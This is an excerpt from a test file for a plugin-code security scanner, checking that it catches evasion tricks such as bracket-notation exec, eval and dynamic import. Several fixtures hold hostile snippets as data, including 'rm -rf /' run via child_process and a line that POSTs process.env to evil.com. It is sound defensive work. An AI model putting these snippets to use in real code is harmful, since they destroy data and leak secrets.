...
`;
  ...
  // --- Phase 5.5: Anti-evasion rules ---

  it("detects bracket-notation access to exec (evasion)", () => {
    const source = `
const cp = require("child_process");
cp["exec"]("rm -rf /");
`;
    const findings = scanSource(source, "plugin.ts");
    expect(
      findings.some((f) => f.ruleId === "bracket-property-exec" && f.severity === "critical"),
    ).toBe(true);
  });

  it("detects bracket-notation access to spawn (evasion)", () => {
    const source = `
const cp = require("child_process");
cp["spawn"]("node", ["server.js"]);
`;
  ...
  it("detects bracket-notation access to eval (evasion)", () => {
    const source = `
const fn = globalThis["eval"];
fn("alert(1)");
`;
    const findings = scanSource(source, "plugin.ts");
    expect(
  ...
  it("detects bracket-notation access to Function constructor (evasion)", () => {
    const source = `
const F = globalThis["Function"];
const hack = new F("return 1")();
`;
    const findings = scanSource(source, "plugin.ts");
    expect(
      findings.some((f) => f.ruleId === "bracket-property-exec" && f.severity === "critical"),
...
`;
  ...
  it("does not flag static require with string literal", () => {
    const source = `
...
`;
  ...
  it("detects globalThis bracket access", () => {
    const source = `
const fn = globalThis["constructor"]("return this")();
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "global-this-access" && f.severity === "warn")).toBe(
      true,
    );
  });

  it("detects process['env'] bracket notation with network send", () => {
    const source = `
const secrets = JSON.stringify(process["env"]);
fetch("https://evil.com/harvest", { method: "POST", body: secrets });
`;
    const findings = scanSource(source, "plugin.ts");
    expect(
      findings.some((f) => f.ruleId === "process-env-bracket" && f.severity === "critical"),
    ).toBe(true);
  });

  it("does not flag process['env'] without network context", () => {
    const source = `
const home = process["env"].HOME;
console.log(home);
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "process-env-bracket")).toBe(false);
  });

  // --- P1-6: Dynamic import() rule ---

  it("detects dynamic import() with variable argument", () => {
    const source = `
const modName = "child" + "_process";
const cp = import(modName);
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dynamic-import" && f.severity === "critical")).toBe(
      true,
    );
  });

  it("does not flag static import() with string literal", () => {
    const source = `
const mod = import("./safe-module.js");
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dynamic-import")).toBe(false);
  });

  it("does not flag static import() with template literal", () => {
    const source = `
const mod = import(\`./safe-module.js\`);
`;
    const findings = scanSource(source, "plugin.ts");
  ...
  it("detects import() with expression argument", () => {
    const source = `
const base = "./modules/";
const mod = import(base + "target.js");
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dynamic-import" && f.severity === "critical")).toBe(
      true,
  ...
  // --- H5: Line-continuation evasion detection ---

  it("detects require split across lines (line continuation evasion)", () => {
    const source = `
const cp = require
  ("child_process");
cp.exec("ls");
`;
  ...
  it("detects eval split across lines", () => {
    const source = `
const result = eval
  ("1+1");
`;
  ...
  it("detects exec hidden in a comment-split pattern", () => {
    const source = `
// This is safe code
const cp = require("child_process");
cp.exec /* just kidding */ ("rm -rf /");
`;
    const findings = scanSource(source, "plugin.ts");
    expect(findings.some((f) => f.ruleId === "dangerous-exec" && f.severity === "critical")).toBe(
      true,
...
`;
  ...
  // --- H5-improved: Nested parens tracking ---

  it("detects require with nested function call argument", () => {
    const source = `
...
`;
  ...
  it("detects eval with multi-line nested parens", () => {
    const source = `
const result = eval(
  buildCode(
    "1+1"
...
`;
  ...
  it("does not false-positive on parens inside strings when joining", () => {
    const source = `
const x = "safe (string)";
const y = doSomething();
`;
